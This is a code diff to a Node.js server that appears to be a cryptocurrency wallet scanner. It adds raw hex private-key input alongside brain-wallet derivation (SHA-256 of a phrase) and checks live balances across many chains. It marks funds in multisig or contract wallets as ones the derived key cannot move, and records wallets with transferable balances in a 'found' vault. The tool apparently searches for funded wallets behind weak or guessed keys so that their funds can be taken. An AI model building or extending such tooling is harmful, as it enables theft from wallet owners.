@@ -2368,7 +2368,7 @@ function saveApiKeysConfig() {
    file instead of guesswork. Everything here is read-only telemetry: it never
    invents a balance, never promotes a lead and never touches a vault.
    ──────────────────────────────────────────────────────────────────────── */
-const APP_VERSION = '2.7.2';
+const APP_VERSION = '2.7.3';
 const DIAG_LOG_FILE = path.join(PERSISTENT_STATE_DIR, 'diagnostics.log');
 const DIAG_REPORT_FILE = path.join(PERSISTENT_STATE_DIR, 'DIAGNOSTIC_REPORT.txt');
 const DIAG_BOOT_AT = Date.now();
@@ -3555,7 +3555,7 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
                 it.balanceUsd = +(Number(it.balanceUsd || 0) + usdAdd).toFixed(2);
                 it.walletHistoryState = 'FUNDED_NOW';
                 it.historicalLabel = `LIVE MULTICALL3 ${cfg.name.toUpperCase()} HIT (${humanBal.toFixed(4)} ${m.symbol})`;
-                contractChecks.push({ it, address: m.address });
+                contractChecks.push({ it, address: m.address, coin: m.symbol, chain: cfg.name });
               }
             }
             if (contractChecks.length === 0) return;
@@ -3573,6 +3573,8 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
                     h.it.fundsLocked = true;
                     h.it.lockReason = h.it.lockReason ||
                       'These funds sit in a smart contract (typically a multisig like a Safe). The derived key cannot move them.';
+                    h.it.lockedCoins = h.it.lockedCoins || {};
+                    h.it.lockedCoins[h.coin || h.chain || 'EVM'] = h.it.lockReason;
                   }
                 });
               }).catch(() => {});
@@ -3642,6 +3644,9 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
                     it.fundsLocked = true;
                     it.lockReason = it.lockReason ||
                       'This TRON account requires multiple signatures (multi-sig permissions). This key alone cannot move the funds.';
+                    it.lockedCoins = it.lockedCoins || {};
+                    it.lockedCoins.TRX = it.lockReason;
+                    it.lockedCoins.USDT_TRC20 = it.lockReason;
                   }
                 }).catch(() => {})
             );
@@ -6440,14 +6445,25 @@ const server = http.createServer((req, res) => {
   if (url.pathname === '/api/inspect-seed' && req.method === 'POST') {
     let body = '';
     req.on('data', chunk => body += chunk);
-    req.on('end', () => {
+    req.on('end', async () => {
       try {
         const { mnemonic, passphrase } = JSON.parse(body || '{}');
         const raw = (mnemonic || '').trim();
         let wallet;
         let isValid = false;
         let isRestricted = false;
-        if (raw.startsWith('brain:') || (raw.split(/\s+/).length < 12 && raw.length > 0)) {
+        if (/^(0x)?[0-9a-fA-F]{64}$/.test(raw)) {
+          // Raw 256-bit hex private key (documented on the Check tab).
+          const hex = raw.replace(/^0x/i, '');
+          const privKey = Buffer.from(hex, 'hex');
+          wallet = {
+            input: `0x${hex}`,
+            keyType: 'hex',
+            wordCount: 0,
+            ...eng.deriveAddressesFromPrivKey(privKey, true)
+          };
+          isValid = true;
+        } else if (raw.startsWith('brain:') || (raw.split(/\s+/).length < 12 && raw.length > 0)) {
           const phrase = raw.replace(/^brain:\s*"?|"?$/g, '');
           const privKey = crypto.createHash('sha256').update(phrase).digest();
           wallet = {
@@ -6469,13 +6485,35 @@ const server = http.createServer((req, res) => {
           eng.KNOWN_ACTIVITY_MAP.get(wallet.btcLegacy) ||
           eng.KNOWN_ACTIVITY_MAP.get(wallet.btcSegwit);
         applyWalletHistoryMetadata(wallet, known);
-        if (wallet.everHeldCrypto) {
+        // History flags first — live verification resets everHeldCrypto before
+        // re-deriving it from chain answers.
+        const historyEverHeld = Boolean(wallet.everHeldCrypto) || Number(wallet.historicalTx || 0) > 0;
+        // Live mainnet balances + spendability classification (contract/multisig
+        // locks via eth_getCode / TRON permissions). persist:false — the vault
+        // rule for manual checks is applied right below, not by the pipeline.
+        try {
+          await verifyBatchLiveOnServer([wallet],
+            ['BTC', 'ETH', 'USDT', 'MATIC', 'BNB', 'SOL', 'TRX', 'XRP', 'ARB', 'BASE', 'OP', 'AVAX'],
+            { force: true, persist: false });
+        } catch (_) {}
+        if (historyEverHeld) wallet.everHeldCrypto = true;
+        const fundedNow = Object.keys(wallet.balances || {}).length > 0 || Number(wallet.balanceUsd || 0) > 0;
+        const allTransferable = fundedNow && !wallet.fundsLocked;
+        let savedTo = 'none';
+        if (fundedNow && !wallet.fundsLocked) {
+          // Manual-check vault rule: only transferable funds are recorded as
+          // found — locked balances are reported, never counted as recoverable.
+          saveFoundWalletToVault({ ...wallet, source: 'Seed Inspector' });
           saveEverHeldWalletToVault({ ...wallet, source: 'Seed Inspector' });
+          savedTo = 'found';
+        } else if (wallet.everHeldCrypto) {
+          saveEverHeldWalletToVault({ ...wallet, source: 'Seed Inspector' });
+          savedTo = 'ever-held';
         } else if (!alreadyScannedEmpty && !isRestricted) {
           markWalletSessionScreened(wallet);
         }
         res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ isValid, isRestricted, alreadyScannedEmpty, wallet, known }));
+        res.end(JSON.stringify({ isValid, isRestricted, alreadyScannedEmpty, wallet, known, fundedNow, allTransferable, savedTo }));
       } catch (e) {
         res.writeHead(400, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ error: e.message }));
